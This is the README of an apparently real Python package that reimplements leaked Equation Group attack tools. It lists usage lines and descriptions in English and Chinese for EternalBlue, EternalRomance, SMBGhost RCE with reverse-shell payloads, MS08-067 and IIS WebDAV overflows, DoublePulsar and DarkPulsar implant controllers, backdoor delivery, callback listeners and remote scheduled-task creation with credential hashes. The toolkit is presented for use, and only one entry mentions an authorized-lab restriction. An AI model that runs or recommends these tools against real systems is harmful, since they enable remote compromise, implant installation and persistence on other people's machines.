# nsa-equation-py

Python reimplementations of legacy tooling (e.g. the DNS payload-builder derived from `dns.exe` via IDA Pro) in portable Python.

## Installation

```bash
pip install .
```

This provides two entry points: `nsa-equation-py` and `nsa`.

## Global options

```text
nsa-equation-py [-h] [-v] [-m MODEL] [-k KEY] [-H HOST] <subcommand> [subcommand options]
```

- `-h, --help`        show the top-level help and list all subcommands
- `-v, --version`     print the version and exit
- `-m, --model MODEL` OpenAI chat model name (default: gpt-3.5-turbo)
- `-k, --key KEY`     OpenAI API key
- `-H, --host HOST`   OpenAI API base URL

Some subcommands (notably `dns`) forward their remaining arguments verbatim to an internal option parser rather than to argparse.

## Subcommand usage reference

The table below lists every registered subcommand with its exact `usage` line and a one-line description. Run `nsa-equation-py <subcommand> --help` for the full option set of any subcommand.

# 子命令全览与用法

## `addresource`

```text
usage: nsa-equation-py addresource [-h] [FLAGS] TYPE NAME PE_PATH RESOURCE_PATH
```

addresource — 将资源从源 PE/DLL 提取并注入目标 PE 文件，支持 zlib 压缩与 LCG 异或混淆。

## `archi-touch`

```text
usage: nsa-equation-py archi-touch [-h] [-p PORT] [--timeout TIMEOUT] [-v] TARGET
```

Python 重写的 NSA Architouch (ARTO) RPC 端口探测工具 Architouch-1.0.0。连接到目标 TCP RPC 服务端口，探测目标架构信息。

## `bpfcompiler`

```text
usage: nsa-equation-py bpfcompiler [-h] [-v] EXPRESSION [OUTPUT_FILE]
```

BpfCompiler — BPF 编译工具。使用 wpcap 库编译 BPF过滤器表达式。

## `clocksvc`

```text
usage: nsa-equation-py clocksvc [-h] [--listen PORT] [--mailslot NAME] [--service NAME] [--registry KEY] [-v]
```

ClockSvc — 监听/代理工具。使用 KERNEL32 文件/服务/注册表操作、USER32 窗口操作、ADVAPI32 服务和注册表操作、MSVCRT 标准 C 运行时、WSOCK32 socket 监听。

## `cve-2020-0796-exp`

```text
usage: nsa-equation-py cve-2020-0796-exp [-h] -i IP [-p PORT] [--check] [-e] [--lhost LHOST] [--lport LPORT] [--arch ARCH] [--silent] [--shellcode] [--load-shellcode LOAD_SHELLCODE]
```

CVE-2020-0796 (SMBGhost) 检测与利用。--check 检测目标是否协商 SMB 3.1.1 且启用 SMB 压缩上下文（潜在受影响面）；-e 执行完整的 kernel RCE 链，投递反弹 shell 载荷。仅限授权实验室研究使用，失败会导致目标蓝屏。

## `cve-2020-0796-exp-unpacked`

```text
usage: nsa-equation-py cve-2020-0796-exp-unpacked [-h] [-p PORT] TARGET_IP
```

CVE-2020-0796 (SMBGhost) 远程内核 RCE 漏洞利用，unpacked（de-PyInstaller）变体。通过 SMBv3.1.1 压缩传输触发 srvnet.sys 缓冲区溢出，获得内核任意读写并绕过 NX。

## `cve-2020-0796-scanner`

```text
usage: nsa-equation-py cve-2020-0796-scanner [-h] [-p PORT] [-t TIMEOUT] [-n THREADS] targets [targets ...]
```

扫描目标（单个 IP 或 CIDR 子网）并通过 SMB2 NEGOTIATE 探测其协商的 SMB 方言；协商 SMB 3.1.1 (0x0311) 的主机为 CVE-2020-0796 潜在受影响面。仅检测，不包含实际利用。

## `danecfg`

```text
usage: nsa-equation-py danecfg [-h] template_dll plugin_dll plugin_core_dll config_xml output_dll
```

danecfg — DANE DLL configuration packer. Python port of danecfg.exe. Original usage recovered from strings: danecfg.exe TEMPLATE_DLL PLUGIN_DLL PLUGIN_CORE_DLL CONFIG_XML OUTPUT_DLL It validates PE architecture, loads plugin DLL marshalParams/freeMarshaledParams APIs, parses XML, compresses package data (LZO), and writes plugin/config resources to a copy of the template DLL.

## `darkpulsar`

```text
usage: nsa-equation-py darkpulsar [-h] [-p PORT] [--timeout TIMEOUT] [--ssp-mtu MTU] [--architecture {x86,x64}] [--ssp-fragment-size SIZE] [--protocol {SMB,NBT,SSL,RDP}] [--use-ntlm-ssp-header] [--no-use-ntlm-ssp-header] [--implant-action {Burn,RawShellcode,EDFStagedUpload,DisableSecurity,EnableSecurity,UpgradeImplant,PingPong}] [--shellcode HEX] [--new-file FILE] [--write-path PATH] [--ping-pong-buffer-size SIZE] [--private-key-input-type {XML,File}] [--sig-private-key HEX] [--private-key-file FILE] [-v] TARGET
```

Python 重写的 NSA Darkpulsar (DARKPULSAR) 植入物工具 Darkpulsar-1.1.0。通过 SMB/NBT/SSL/RDP 协议与目标主机上的 DAPU 植入物通信，执行烧录、shellcode 注入、后门升级等操作。

## `dns`

```text
nsa-equation-py dns <args...>   # 透传给 dns_tool（如 -y bind -R 1.2.3.4 -p 1100；另支持 dns --list）
```

DNS payload-builder（1MS07-029-DNS/dns.exe 的 Python 重写）

## `domain-touch`

```text
usage: nsa-equation-py domain-touch [-h] [-p PORT] [--timeout TIMEOUT] [--credential-type {Ticket,UnicodeCreds,MachineHash,PasswordHash}] [--username HEX] [--credential HEX] [-v] TARGET
```

Python 重写的 NSA Domaintouch 域控制器探测工具 Domaintouch-1.1.1。通过 SMB/Netlogon 协议探测目标域控制器，获取域 NetBIOS 名、DNS 名、SID 和 GUID 等信息。

## `doublefeaturereader`

```text
usage: nsa-equation-py doublefeaturereader [-h] CONTAINER_FILE
```

doublefeaturereader — 读取并转储 DoubleFeature/CritterFrenzy 隐蔽容器文件中的字段（CFStore、CFContent、字体、系统信息等）。

## `doublepulsar`

```text
usage: nsa-equation-py doublepulsar [-h] [-f {Ping,Install,Uninstall,RunDLL,RunShellcode,OutputInstall}] [-P TARGET_PORT] [--protocol {SMB,NBT}] [--architecture {x86,x64,auto}] [--dll-payload DLL_PAYLOAD] [--dll-ordinal DLL_ORDINAL] [--process-name PROCESS_NAME] [--process-command-line PROCESS_COMMAND_LINE] [--shellcode-file SHELLCODE_FILE] [--output-file OUTPUT_FILE] [--output-install] [--network-timeout NETWORK_TIMEOUT] target_ip
```

doublepulsar — DoublePulsar SMB implant CLI. Port of Doublepulsar-1.3.1.exe. The analyzed binary exposes Function, Architecture, Target/Protocol, DLL/shellcode and output parameters; it performs SMB setup, pings the implant (magic response 0x19293944/0x19293949 family), extracts architecture/XOR key, and then installs/uninstalls/executes payloads.

## `ds_parselogs`

```text
usage: nsa-equation-py ds_parselogs [-h] CAPTURE_FILE RESULTS_PREFIX
```

ds_parselogs — DSky/Darkskyline capture 文件分片器。按标准 pcap 文件头把输入文件切片，每段原样写出为 <results_prefix>_%%02d.pcap；不做 XOR-0xE3 混淆或 AES 解密。

## `dszlpcore`

```text
usage: nsa-equation-py dszlpcore [-h] [-P TARGET_PORT] [--callback-ip CALLBACK_IP] [--callback-port CALLBACK_PORT] [--callback-local-port CALLBACK_LOCAL_PORT] [--groom GROOM] [--max-attempts MAX_ATTEMPTS] [--no-verify-target] [--verify-backdoor] [--network-timeout NETWORK_TIMEOUT] [--xor-mask XOR_MASK] target_ip
```

dszlpcore — DszLpCore (SMB) 后门核心，基于 nsa_equation/dave 统一协议库。

## `eafu`

```text
usage: nsa-equation-py eafu [-h] [-p PORT] [--timeout TIMEOUT] [--enable-ssl] [--iis-path-size IIS_PATH_SIZE] [--host-string STR] [--payload-access-type {Callback,Listen,Backdoor}] [--callback-ip IP] [--callback-port PORT] [--callback-local-port PORT] [--backdoor] [--backdoor-header {Accept,Accept-Charset,Accept-Encoding,Accept-Language,Allow,Authorization,Cache-Control,Content-Encoding,Content-Language,Content-Location,Content-MD5,Content-Range,Content-Type,Cookie,Date,Expect,Expires,From,If-Match,If-Modified-Since,If-None-Match,If-Range,If-Unmodified-Since,Last-Modified,Max-Forwards,Pragma,Proxy-Authorization,Range,Referer,Trailer,Translate,Upgrade,User-Agent,Via,Warning}] [--backdoor-value-source {Manual,RandomEtag,RandomBasicAuth}] [--backdoor-value VALUE] [--backdoor-delay BACKDOOR_DELAY] [--backdoor-retries BACKDOOR_RETRIES] [--target-os {W2K3SP0,W2K3SP1,W2K3SP2,W2K3SP0_v5IM,W2K3SP1_v5IM}] [-v] TARGET
```

Python 重写的 NSA EAFU (EXCA / MS03-007) 利用工具 EAFU.exe。针对 Microsoft IIS 6.0 WebDAV，通过构造溢出缓冲区与 ROP 链执行任意代码，并可选投递后门。

## `eafu_ssl`

```text
usage: nsa-equation-py eafu_ssl [-h] [-p PORT] [-U URI] [-y PAYLOAD] [-L ADDR] [-P PORT] [-o OS] TARGET_IP
```

EAFU_SSL (EAFU 2.2.0/EAFU_SSL.exe) — Equation Group IIS WebDAV缓冲区溢出漏洞利用的 SSL/TLS 变体。通过 HTTPS (端口 443)向目标发送利用请求，携带反弹 shell 或下载执行 shellcode。

## `eagerlever`

```text
usage: nsa-equation-py eagerlever [-h] [-p PORT] [-o TYPE] [-U USER] [-P PASS] [-d DOMAIN] [-f FILE] [-l DLL] [-t SEC] [-n] [-i IP] [-Q PORT] TARGET_IP
```

EAGERLEVER (ELV 2.1.3) — Equation Group SMB/RPC 漏洞利用工具，针对 Windows 2000 / XP / Server 2003 目标，通过 srvsvc RPC接口投放 RIDEAREA 植入。支持回连监听器。

## `easy_pi`

```text
usage: nsa-equation-py easy_pi [-h] [-P TARGET_PORT] [--callback-ip CALLBACK_IP] [--callback-port CALLBACK_PORT] [--callback-local-port CALLBACK_LOCAL_PORT] [--groom GROOM] [--max-attempts MAX_ATTEMPTS] [--no-verify-target] [--verify-backdoor] [--network-timeout NETWORK_TIMEOUT] [--xor-mask XOR_MASK] target_ip
```

easy_pi — Easypi (SMB) 利用，基于 nsa_equation/dave 统一协议库。

## `easybee`

```text
usage: nsa-equation-py easybee [-h] [-P TARGET_PORT] [--callback-ip CALLBACK_IP] [--callback-port CALLBACK_PORT] [--callback-local-port CALLBACK_LOCAL_PORT] [--groom GROOM] [--max-attempts MAX_ATTEMPTS] [--no-verify-target] [--verify-backdoor] [--network-timeout NETWORK_TIMEOUT] [--xor-mask XOR_MASK] target_ip
```

easybee — Easybee (SMB) 利用，基于 nsa_equation/dave 统一协议库。

## `eclipsedwing`

```text
usage: nsa-equation-py eclipsedwing [-h] [-P TARGET_PORT] --callback-ip CALLBACK_IP --callback-port CALLBACK_PORT [--callback-local-port CALLBACK_LOCAL_PORT] [--callin-port CALLIN_PORT] [--listen-port LISTEN_PORT] [--payload-dll PAYLOAD_DLL] [--fb-storage FB_STORAGE] [--protocol {SMB,NBT}] [--network-timeout NETWORK_TIMEOUT] [--callin-timeout CALLIN_TIMEOUT] [--target-mode {Callback,Listener,RPCReuse}] [--rpc-proxy RPC_PROXY] [--xor-mask XOR_MASK] [--no-nx] target_ip
```

eclipsedwing — MS08-067 (Samba NetPathCanonicalize) exploit framework. Python port of Eclipsedwing-1.5.2.exe. Reverse-engineered from IDA analysis: static libs adfw-2/tibe-1/trfo-2/trch-0/tucl-1, parameters extracted from InitializeParameters (sub_401D10). Supports three operational modes: Callback (default, target calls back), Listener (client-initiated), RPCReuse (forwards through a reusable RPC pipe). Builds a primer package, prepares an XOR-masked egg with AuthCode, builds an NX / non-NX exploit package for MS08-067, and optionally installs a DoublePulsar payload via FbStorage.

## `eclipsedwingtouch`

```text
usage: nsa-equation-py eclipsedwingtouch [-h] [-P TARGET_PORT] [--protocol {SMB,NBT}] [--network-timeout NETWORK_TIMEOUT] [--server-name SERVER_NAME] [--client-name CLIENT_NAME] [--os-patch OS_PATCH] target_ip
```

eclipsedwingtouch — MS08-067 vulnerability touch (detector). Python port of Eclipsedwingtouch-1.0.4.exe. Implements the "touch" check: establishes an SMB connection to the target, binds the BROWSER RPC interface and sends a NetPathCompare-style request (per the strings "Building PathName1", "Building PathName2" and "Creating NetPathCompare request") to determine whether the host answers the MS08-067 path-walk. Prints VULNERABLE / NOT vulnerable.

## `ecwi`

```text
usage: nsa-equation-py ecwi [-h] [-p PORT] [--timeout TIMEOUT] [--protocol {SMB,NBT}] [--payload {Callback,Listener}] [--callback-ip IP] [--callback-port PORT] [--callback-local-port PORT] [--listen-port PORT] [--callin-port PORT] [--callin-timeout CALLIN_TIMEOUT] [--run-mode {EDF,Standalone}] [--ride-area FILE] [--lp-filename FILE] [--lp-entry-point NAME] [--target-os {W2KSP4,XPSP2,XPSP3,W2K3SP1,W2K3SP2}] [-v] TARGET
```

Python 重写的 NSA ECWI 利用工具 ecwi.exe / RPC2.exe。通过 SMB/NBT 驱动，执行缓冲区溢出与 ROP 链利用，并可选投递 egg 回连载荷。

## `educated-scholar`

```text
usage: nsa-equation-py educated-scholar [-h] [-P TARGET_PORT] [--callback-ip CALLBACK_IP] [--callback-port CALLBACK_PORT] [--callback-local-port CALLBACK_LOCAL_PORT] [--groom GROOM] [--max-attempts MAX_ATTEMPTS] [--no-verify-target] [--verify-backdoor] [--network-timeout NETWORK_TIMEOUT] [--xor-mask XOR_MASK] target_ip
```

educated-scholar — Educatedscholar (MS09-050 SMB) 远程利用，基于 nsa_equation/dave 统一协议库。

## `educated-scholar-touch`

```text
usage: nsa-equation-py educated-scholar-touch [-h] [-p PORT] [--timeout TIMEOUT] [--process-id-high PROCESS_ID_HIGH] [-v] TARGET
```

Python 重写的 NSA Educatedscholartouch (EDU Touch) SMB 触摸/探测工具 Educatedscholartouch-1.0.0。通过 SMB 协议探测目标主机的可达性与架构信息。

## `elv`

```text
usage: nsa-equation-py elv [-h] TARGET [PORT]
```

elv — 针对目标的 SMB/RPC 服务进行探测与利用，尝试植入后门。

## `emerald_thread`

```text
usage: nsa-equation-py emerald_thread [-h] [-P TARGET_PORT] [--callback-ip CALLBACK_IP] [--callback-port CALLBACK_PORT] [--callback-local-port CALLBACK_LOCAL_PORT] [--groom GROOM] [--max-attempts MAX_ATTEMPTS] [--no-verify-target] [--verify-backdoor] [--network-timeout NETWORK_TIMEOUT] [--xor-mask XOR_MASK] target_ip
```

emerald_thread — Emeraldthread (MS10-061 Print SMB) 远程利用，基于 nsa_equation/dave 统一协议库。

## `emerald_thread_touch`

```text
usage: nsa-equation-py emerald_thread_touch [-h] [-p PORT] [-o SEC] TARGET_IP
```

Emerald Thread Touch — 通过 RPC spoolss 接口枚举目标上的共享打印机。建立 SMB/RPC 会话，绑定 spoolss 接口，调用RpcEnumPrinters/RpcEnumPorts 枚举打印机并报告数量。

## `emphasis_mine`

```text
usage: nsa-equation-py emphasis_mine [-h] [-P TARGET_PORT] [--callback-ip CALLBACK_IP] [--callback-port CALLBACK_PORT] [--callback-local-port CALLBACK_LOCAL_PORT] [--groom GROOM] [--max-attempts MAX_ATTEMPTS] [--no-verify-target] [--verify-backdoor] [--network-timeout NETWORK_TIMEOUT] [--xor-mask XOR_MASK] target_ip
```

emphasis_mine — Emphasismine (SMB) 利用，基于 nsa_equation/dave 统一协议库。

## `englishmansdentist`

```text
usage: nsa-equation-py englishmansdentist [-h] [-P TARGET_PORT] [--callback-ip CALLBACK_IP] [--callback-port CALLBACK_PORT] [--callback-local-port CALLBACK_LOCAL_PORT] [--groom GROOM] [--max-attempts MAX_ATTEMPTS] [--no-verify-target] [--verify-backdoor] [--network-timeout NETWORK_TIMEOUT] [--xor-mask XOR_MASK] target_ip
```

englishmansdentist — Englishmansdentist (SMB/Exchange) 利用，基于 nsa_equation/dave 统一协议库。

## `epwrapper`

```text
usage: nsa-equation-py epwrapper [-h] [-v] INPUT_FILE [OUTPUT_FILE]
```

EpWrapper — 包装工具。使用 WS2_32 socket、KERNEL32文件/目录操作、MSVCR71 标准 C 运行时包装 EP 文件。

## `erratic-gopher-touch`

```text
usage: nsa-equation-py erratic-gopher-touch [-h] [-p PORT] [--timeout TIMEOUT] [-v] TARGET
```

Python 重写的 NSA Erraticgophertouch (ERRATICGOPHER Touch) RPC 触摸/探测工具 Erraticgophertouch-1.0.1。通过 MSRPC 协议探测目标主机的 Dimsvc 服务可达性。

## `eske`

```text
usage: nsa-equation-py eske [-h] [-p PORT] [-o TYPE] [-s LEVEL] [-e PIPE] [-U USER] [-P PASS] [-d DOMAIN] [-f FILE] [-l DLL] [-x TYPE] [-q NAME] [-t SEC] [-r OPT] [-c OPT] [-i IP] [-E PORT] [-u OPT] [-A TYPE] [-n NAME] [-S NAME] TARGET_IP
```

ESKE 1.6.2 — Equation Group 旧式 Windows 漏洞利用工具。通过 SMB 命名管道向目标发送 RPC 溢出请求，支持 Touch（探测）和 Exploit（利用）两个阶段，可选 Egg Callback 方式上传惯例负载。

## `eskimo_roll`

```text
usage: nsa-equation-py eskimo_roll [-h] [-P TARGET_PORT] [--callback-ip CALLBACK_IP] [--callback-port CALLBACK_PORT] [--callback-local-port CALLBACK_LOCAL_PORT] [--groom GROOM] [--max-attempts MAX_ATTEMPTS] [--no-verify-target] [--verify-backdoor] [--network-timeout NETWORK_TIMEOUT] [--xor-mask XOR_MASK] target_ip
```

eskimo_roll — Eskimoroll (SMB) 利用，基于 nsa_equation/dave 统一协议库。

## `esteem-audit-touch`

```text
usage: nsa-equation-py esteem-audit-touch [-h] [-p PORT] [--timeout TIMEOUT] [--packet-timeout PACKET_TIMEOUT] [--max-process-count MAX_PROCESS_COUNT] [--rdplib-hertz RDPLIB_HERTZ] [--send-spacebar] [--no-send-spacebar] [--process-count-to-send-space PROCESS_COUNT_TO_SEND_SPACE] [--max-rdplib-error-count MAX_RDPLIB_ERROR_COUNT] [-v] TARGET
```

Python 重写的 NSA Esteemaudittouch (ETA Touch) RDP 触摸/探测工具 Esteemaudittouch-2.1.0。通过 RDP 协议探测目标主机的架构、OS 版本、加密方式和智能卡认证支持。

## `esteem_audit`

```text
usage: nsa-equation-py esteem_audit [-h] [-P TARGET_PORT] [--callback-ip CALLBACK_IP] [--callback-port CALLBACK_PORT] [--callback-local-port CALLBACK_LOCAL_PORT] [--groom GROOM] [--max-attempts MAX_ATTEMPTS] [--no-verify-target] [--verify-backdoor] [--network-timeout NETWORK_TIMEOUT] [--xor-mask XOR_MASK] target_ip
```

esteem_audit — Esteemaudit (MS12-020 RDP) 利用，基于 nsa_equation/dave 统一协议库。

## `etbl`

```text
usage: nsa-equation-py etbl [-h] -i IP [-p PORT] [-r OPT] [-c OPT] [-f FILE] [-V VER] [-M ADDR] [-l DLL] [-t PROTO] [-u OPT] [-I IP] [-P PORT] [-o SEC] [-R ADDR]
```

ETCETERABLUE — Equation Group 针对 IMAIL 邮件服务器的 POP/SMTP/HTTP 缓冲区溢出漏洞利用工具。支持 Touch（探测）和 Exploit（利用）两个阶段，可选 Egg Callback 方式上传惯例负载。

## `eternal-champion`

```text
usage: nsa-equation-py eternal-champion [-h] [-p PORT] [--timeout TIMEOUT] [--pipe PIPE] [--share SHARE] [--protocol {SMB,NBT}] [--target-os {XP_SP0SP1_X86,XP_SP2SP3_X86,XP_SP1_X64,XP_SP2_X64,SERVER_2003_SP0,SERVER_2003_SP1,SERVER_2003_SP2,VISTA_SP0,VISTA_SP1,VISTA_SP2,SERVER_2008_SP0,SERVER_2008_SP1,SERVER_2008_SP2,WIN7_SP0,WIN7_SP1,SERVER_2008R2_SP0,SERVER_2008R2_SP1,WIN8_SP0}] [--arch {Unknown,x86,x64}] [--credentials {Anonymous,Guest,Blank,Password,NTLM}] [--username HEX] [--password HEX] [--ntlm-hash HEX] [--attempts ATTEMPTS] [--shellcode FILE] [--verify-target] [-v] TARGET
```

Python 重写的 NSA EternalChampion (ETCH / MS17-010) 利用工具 Eternalchampion-2.0.0。通过 TCP 445/139 驱动 SMBv1/NBT，执行架构识别、exploit 缓冲构建与投递，并可选验证目标。

## `eternal-romance`

```text
usage: nsa-equation-py eternal-romance [-h] [-p PORT] [--timeout TIMEOUT] [--pipe PIPE] [--protocol {SMB,NBT}] [--exploit-method {Default,Fish-in-a-barrel,Matched-pairs,Classic-Romance}] [--credentials {Anonymous,Guest,Blank,Password,NTLM}] [--username HEX] [--password HEX] [--ntlm-hash HEX] [--target-os {XP_SP0SP1_X86,XP_SP2SP3_X86,XP_SP1_X64,XP_SP2_X64,SERVER_2003_SP0,SERVER_2003_SP1,SERVER_2003_SP2,VISTA_SP0,VISTA_SP1,VISTA_SP2,SERVER_2008_SP0,SERVER_2008_SP1,SERVER_2008_SP2,WIN7_SP0,WIN7_SP1,SERVER_2008R2_SP0,SERVER_2008R2_SP1}] [--attempts ATTEMPTS] [--teardown-backdoor] [--payload {Callback,Listener}] [--callback-ip IP] [--callback-port PORT] [--callback-local-port PORT] [--listen-port PORT] [--callin-port PORT] [-v] TARGET
```

Python 重写的 NSA EternalRomance (ETROMANCE / MS17-010) 利用工具 Eternalromance-1.3.0。通过 TCP 445/139 驱动 SMBv1/NBT，执行架构识别、Transaction 泄漏、内存劫持与后门投递。

## `eternal-romance-1.4`

```text
usage: nsa-equation-py eternal-romance-1.4 [-h] [-p PORT] [--timeout TIMEOUT] [--pipe PIPE] [--protocol {SMB,NBT}] [--exploit-method {Default,Fish-in-a-barrel,Matched-pairs,Classic-Romance}] [--credentials {Anonymous,Guest,Blank,Password,NTLM}] [--username HEX] [--password HEX] [--ntlm-hash HEX] [--target-os {XP_SP0SP1_X86,XP_SP2SP3_X86,XP_SP1_X64,XP_SP2_X64,SERVER_2003_SP0,SERVER_2003_SP1,SERVER_2003_SP2,VISTA_SP0,VISTA_SP1,VISTA_SP2,SERVER_2008_SP0,SERVER_2008_SP1,SERVER_2008_SP2,WIN7_SP0,WIN7_SP1,SERVER_2008R2_SP0,SERVER_2008R2_SP1}] [--attempts ATTEMPTS] [--teardown-backdoor] [--payload {Callback,Listener}] [--callback-ip IP] [--callback-port PORT] [--callback-local-port PORT] [--listen-port PORT] [--callin-port PORT] [-v] TARGET
```

Python 重写的 NSA EternalRomance (ETROMANCE / MS17-010) 利用工具 Eternalsynergy-1.0.1。通过 TCP 445/139 驱动 SMBv1/NBT，执行架构识别、Transaction 泄漏、内存劫持与后门投递。

## `eternalblue`

```text
usage: nsa-equation-py eternalblue [-h] [--ip IP] [-p PORT] [--timeout TIMEOUT] [--groom GROOM] [--attempts ATTEMPTS] [--verify-target] [--verify-backdoor] [-o OS] [-a {x86,x64}] [-v] TARGET
```

Python 重写的 NSA EternalBlue (ETERNALBLUE / MS17-010) 利用工具 Eternalblue-2.2.0。通过 TCP 445 驱动 SMBv1，执行非分页池占位、架构识别 (x86/x64)、exploit 缓冲发送，并可选验证 DoublePulsar 后门。

## `eternalsynergy`

```text
usage: nsa-equation-py eternalsynergy [-h] [-P TARGET_PORT] [--callback-ip CALLBACK_IP] [--callback-port CALLBACK_PORT] [--callback-local-port CALLBACK_LOCAL_PORT] [--groom GROOM] [--max-attempts MAX_ATTEMPTS] [--no-verify-target] [--verify-backdoor] [--network-timeout NETWORK_TIMEOUT] [--xor-mask XOR_MASK] target_ip
```

eternalsynergy — Eternalsynergy (MS17-010 SMBv3) 利用，基于 nsa_equation/dave 统一协议库。

## `etre`

```text
usage: nsa-equation-py etre [-h] -i IP [-p PORT] [-r OPT] [-c OPT] [-f FILE] [-l DLL] [-t PROTO] [-u OPT] [-I IP] [-P PORT] [-o SEC] [-A ADDR] [-a ALIAS] [-V VER]
```

ETRE 1.0.4 — Equation Group 针对 IMAIL 邮件服务器的 POP/SMTP/HTTP 缓冲区溢出漏洞利用工具（ETBL 的后续版本）。支持自定义返回地址风格、自定义别名、IMail 版本等选项。

## `evfr`

```text
usage: nsa-equation-py evfr [-h] -i IP [-p PORT] [-r OPT] [-b LANG] [-t PROTO] [-B PROTO] [-f FILE] [-l DLL] [-x TYPE] [-q NAME] [-o SEC] [-c OPT] [-u OPT] [-I IP] [-P PORT] [-A TYPE] [-U USER] [-W PASS]
```

EVADEFRED (EVFR 3.2.0.2) — Equation Group 多协议漏洞利用工具，针对 Windows 2000 / Windows XP 目标，支持 SMB 和 HTTP/RPC。支持 Touch（探测）和 Exploit（利用）两个阶段，可选 Egg Callback 方式上传惯例负载。

## `ewok_frenzy`

```text
usage: nsa-equation-py ewok_frenzy [-h] [-P TARGET_PORT] [--callback-ip CALLBACK_IP] [--callback-port CALLBACK_PORT] [--callback-local-port CALLBACK_LOCAL_PORT] [--groom GROOM] [--max-attempts MAX_ATTEMPTS] [--no-verify-target] [--verify-backdoor] [--network-timeout NETWORK_TIMEOUT] [--xor-mask XOR_MASK] target_ip
```

ewok_frenzy — Ewokfrenzy (SMB) 利用，基于 nsa_equation/dave 统一协议库。

## `expa`

```text
usage: nsa-equation-py expa [-h] [--list] [--extract TYPE NAME OUT_FILE] [--inject TYPE NAME IN_FILE] PE_FILE
```

EXPA 1.0.0.2 — Equation Group PE 资源操作工具。从 PE 文件中枚举、提取或注入资源，镜像原始工具的 FindResourceA/LoadResource/LockResource/SizeofResource 流程。

## `exploding-can-touch`

```text
usage: nsa-equation-py exploding-can-touch [-h] [-p PORT] [--timeout TIMEOUT] [--enable-ssl] [--host-string STR] [--max-size-to-check MAX_SIZE_TO_CHECK] [--delay DELAY] [-v] TARGET
```

Python 重写的 NSA Explodingcantouch (EXCA Touch) IIS WebDAV 触摸/探测工具 Explodingcantouch-1.2.1。通过 HTTP 请求探测目标 IIS 6.0 WebDAV 路径大小。

## `exploding_can`

```text
usage: nsa-equation-py exploding_can [-h] [-P TARGET_PORT] [--callback-ip CALLBACK_IP] [--callback-port CALLBACK_PORT] [--callback-local-port CALLBACK_LOCAL_PORT] [--groom GROOM] [--max-attempts MAX_ATTEMPTS] [--no-verify-target] [--verify-backdoor] [--network-timeout NETWORK_TIMEOUT] [--xor-mask XOR_MASK] target_ip
```

exploding_can — Explodingcan (IIS WebDAV) 利用，基于 nsa_equation/dave 统一协议库。

## `genkey`

```text
usage: nsa-equation-py genkey [-h] [-v] KEY_SIZE [DIR]
```

GenKey — RSA 密钥生成工具。生成 1024/2048 位 RSA公钥/私钥对，并进行自测验证。

## `getarch`

```text
usage: nsa-equation-py getarch [-h] [-target HOST] [-targets FILE] [-timeout TIMEOUT] [-debug]
```

连接到目标 TCP 135 (RPC Endpoint Mapper)，向 portmapper 提交一个使用 NDR64 transfer syntax 的 DCERPC BIND：64 位 Windows 接受 NDR64，32 位 Windows 拒绝之 (proposed_transfer_syntaxes_not_supported)。只读探测，不修改目标状态。

## `gkdecoder`

```text
usage: nsa-equation-py gkdecoder [-h] [-v] INPUT_FILE [OUTPUT_FILE]
```

GkDecoder — 二进制到 XML 解码工具。使用 KERNEL32 文件操作、MSVCRT/MSVCP60 (C++ 标准库)、Xml4_0u (XML 解析)、ole32(CoInitialize)、OLEAUT32 (SysAllocString, SysFreeString)、USER32 (MessageBoxW) 将二进制数据解码为 XML 格式。

## `greatdoccfg`

```text
usage: nsa-equation-py greatdoccfg [-h] [-v] INPUT_FILE [OUTPUT_FILE]
```

GreatDoc DLL 配置工具。使用 KERNEL32 文件/资源操作(EndUpdateResourceW, GetLastError, BeginUpdateResourceW,UpdateResourceW, HeapFree, TerminateProcess,GetCurrentProcess, UnhandledExceptionFilter,SetUnhandledExceptionFilter, IsDebuggerPresent,HeapCreate, VirtualFree, DeleteCriticalSection,LeaveCriticalSection, EnterCriticalSection, HeapAlloc,VirtualAlloc, HeapReAlloc, GetModuleHandleW, Sleep,GetProcAddress, ExitProcess, WriteFile, GetStdHandle,GetModuleFileNameW, FreeEnvironmentStringsW,GetEnvironmentStringsW, GetCommandLineW, SetHandleCount,GetFileType, GetStartupInfoA, TlsGetValue, TlsAlloc,TlsSetValue, TlsFree, InterlockedIncrement, SetLastError,GetCurrentThreadId, InterlockedDecrement,QueryPerformanceCounter, GetTickCount, GetCurrentProcessId,GetSystemTimeAsFileTime, SetFilePointer,WideCharToMultiByte, GetConsoleCP, GetConsoleMode,GetCPInfo, GetACP, GetOEMCP, IsValidCodePage,MultiByteToWideChar, InitializeCriticalSectionAndSpinCount,RtlUnwind, LoadLibraryA, SetStdHandle, WriteConsoleW,GetConsoleOutputCP, WriteConsoleW, LCMapStringA,LCMapStringW, GetStringTypeA, GetStringTypeW,GetLocaleInfoA, FlushFileBuffers, HeapSize, CreateFileA,CloseHandle)。

## `iis-touch`

```text
usage: nsa-equation-py iis-touch [-h] [-p PORT] [--timeout TIMEOUT] [--enable-ssl] [--host-string STR] [-v] TARGET
```

Python 重写的 NSA Iistouch (IISTOUCH) IIS 触摸/探测工具 Iistouch-1.2.2。通过 HTTP 协议探测目标 IIS 版本、操作系统、语言、服务包、WebDAV 等信息。

## `job-add`

```text
usage: nsa-equation-py job-add [-h] [-p PORT] [--timeout TIMEOUT] [--command CMD] [--hour HOUR] [--minute MINUTE] [--mode {Offset,Absolute}] [--auth-level {Default,None,Connect,Call,Packet,Integrity,Privacy}] [--credential-type {UnicodeCreds,PasswordHash,MachineHash,KerberosTicket,KerberosFile}] [--username HEX] [--credential HEX] [--password PASS] [--domain-dns DOMAIN] [--kerberos-ticket HEX] [--session-key HEX] [--ticket-file FILE] [-v] TARGET
```

Python 重写的 NSA Jobadd (JOBADD) AT 作业添加工具 Jobadd-1.1.1。通过 SMB/ATSVC 协议在目标主机上添加定时任务。

## `job-delete`

```text
usage: nsa-equation-py job-delete [-h] [-p PORT] [--timeout TIMEOUT] [--job-id ID] [--auth-level {Default,None,Connect,Call,Packet,Integrity,Privacy}] [--credential-type {UnicodeCreds,PasswordHash,MachineHash,KerberosTicket,KerberosFile}] [--username HEX] [--credential HEX] [--domain-dns DOMAIN] [--kerberos-ticket HEX] [--session-key HEX] [--ticket-file FILE] [-v] TARGET
```

Python 重写的 NSA Jobdelete (JOBDELETE) AT 作业删除工具 Jobdelete-1.1.1。通过 SMB/ATSVC 协议在目标主机上删除指定的定时任务。

## `job-list`

```text
usage: nsa-equation-py job-list [-h] [-p PORT] [--timeout TIMEOUT] [--auth-level {Default,None,Connect,Call,Packet,Integrity,Privacy}] [--credential-type {UnicodeCreds,PasswordHash,MachineHash,KerberosTicket,KerberosFile}] [--username HEX] [--credential HEX] [--domain-dns DOMAIN] [--kerberos-ticket HEX] [--session-key HEX] [--ticket-file FILE] [-v] TARGET
```

